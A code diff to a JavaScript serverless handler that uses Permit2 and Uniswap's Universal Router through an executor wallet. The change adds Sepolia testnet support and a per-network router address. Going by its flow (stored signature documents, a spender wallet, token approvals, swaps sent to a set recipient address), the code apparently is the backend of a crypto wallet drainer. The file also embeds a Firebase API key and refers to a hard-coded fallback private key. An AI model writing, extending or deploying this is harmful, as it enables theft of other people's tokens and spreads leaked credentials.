@@ -6,7 +6,10 @@ import { ethers } from 'ethers';
 // Configuration
 // -----------------------------
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
+const UNIVERSAL_ROUTER_BY_NETWORK = {
+  mainnet: "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B",
+  sepolia: "0x3fC91A3afd70395CD496C647d5a6CC9D4B2b7FAD"
+};
 
 // Hard-coded fallback executor address + private key
 const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
@@ -40,9 +43,10 @@ let spenderWallet = null;
 let permit2Contract = null;
 let routerContract = null;
 let OUTPUT_TOKEN_OVERRIDE = null;
+let ACTIVE_NETWORK = 'mainnet';
+let ROUTER_ADDRESS = UNIVERSAL_ROUTER_BY_NETWORK.mainnet;
 
-async function init() {
-  if (db) return; 
+async function init(requestedNetwork) {
 
   const firebaseConfig = {
     apiKey: process.env.FIREBASE_API_KEY || process.env.VITE_FIREBASE_API_KEY || 'AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE',
@@ -54,21 +58,26 @@ async function init() {
     appId: process.env.FIREBASE_APP_ID || process.env.VITE_FIREBASE_APP_ID || '1:750743868519:web:732b9ba46acda5096570c2'
   };
 
-  const app = getApps().length ? getApp() : initializeApp(firebaseConfig, 'vercel-worker-app');
-  db = getFirestore(app);
+  if (!db) {
+    const app = getApps().length ? getApp() : initializeApp(firebaseConfig, 'vercel-worker-app');
+    db = getFirestore(app);
+  }
   
   try {
     const cfgSnap = await getDoc(doc(db, 'admin_config', 'settings'));
     const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
-    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
+    ACTIVE_NETWORK = requestedNetwork === 'sepolia' ? 'sepolia' : (cfg.activeNetwork === 'sepolia' ? 'sepolia' : 'mainnet');
+    const scoped = cfg.networks?.[ACTIVE_NETWORK] || cfg;
+    const rpc = scoped.rpcUrl || process.env.RPC_URL || (ACTIVE_NETWORK === 'sepolia' ? 'https://rpc.sepolia.org' : 'https://cloudflare-eth.com');
 
     provider = new ethers.JsonRpcProvider(rpc);
     
     // Load config
-    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
-    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
-    RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
-    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;
+    EXECUTOR_ADDRESS = scoped.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
+    EXECUTOR_PRIVATE_KEY = scoped.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+    RECIPIENT_ADDRESS = scoped.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
+    OUTPUT_TOKEN_OVERRIDE = scoped.tokenAddress || process.env.OUTPUT_TOKEN || null;
+    ROUTER_ADDRESS = scoped.universalRouter || UNIVERSAL_ROUTER_BY_NETWORK[ACTIVE_NETWORK] || UNIVERSAL_ROUTER_BY_NETWORK.mainnet;
 
     spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
 
@@ -78,7 +87,7 @@ async function init() {
     }
 
     permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
-    routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
+    routerContract = new ethers.Contract(ROUTER_ADDRESS, UNIVERSAL_ROUTER_ABI, spenderWallet);
   } catch (err) {
     console.error('Failed to init:', err);
     throw err;
@@ -96,7 +105,8 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: "Method Not Allowed" });
 
   try {
-    await init();
+    const requestedNetwork = req.body?.activeNetwork;
+    await init(requestedNetwork);
     
     const { docId, outputToken } = req.body;
     const FINAL_TOKEN = outputToken || OUTPUT_TOKEN_OVERRIDE || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
@@ -191,7 +201,7 @@ export default async function handler(req, res) {
         // 3. Approve Router
         const tokenContract = new ethers.Contract(data.token, ERC20_ABI, spenderWallet);
         const approveTx = await tokenContract.approve(
-          UNIVERSAL_ROUTER, 
+          ROUTER_ADDRESS, 
           amount, 
           { nonce: currentNonce++ } // <--- FIX APPLIED
         );
